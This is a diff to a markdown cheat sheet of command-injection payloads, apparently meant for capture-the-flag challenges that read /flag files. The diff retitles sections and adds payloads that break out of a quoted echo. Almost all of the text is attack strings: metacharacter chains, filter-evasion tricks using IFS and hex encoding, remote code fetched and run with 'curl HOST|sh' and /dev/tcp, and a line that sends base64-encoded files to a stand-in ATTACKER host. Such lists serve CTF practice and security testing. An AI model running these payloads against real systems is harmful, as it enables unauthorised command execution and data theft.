@@ -1,6 +1,6 @@
 # Command Injection
 
-## Fast Ladder
+## Try
 
 ```bash
 ;id
@@ -14,7 +14,7 @@ $(id)
 ;base64 /flag*
 ```
 
-## Payloads
+## Shell Metacharacters
 
 ```bash
 ls||id; ls ||id; ls|| id; ls || id # Execute both
@@ -66,7 +66,7 @@ alias ls=whoami;ls
 $(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami in hex
 ```
 
-## Constraint Payloads
+## Restrictions
 
 ```bash
 # no spaces
@@ -88,6 +88,23 @@ awk '{print}' /flag
 # length constrained
 sh</dev/tcp/HOST/PORT
 curl HOST|sh
+```
+
+## Quoted echo
+
+When input lands inside `echo "Info: USER_INPUT"`:
+
+```bash
+";id;echo "
+";cat /flag*;echo "
+";base64 /flag*|curl -X POST --data-binary @- https://ATTACKER/;echo "
+```
+
+If `|&$`` are stripped, try command separators and shell syntax that remain:
+
+```bash
+";id;"
+";IFS=/;cat${IFS}flag*;"
 ```
 
 ## Tool Wrappers
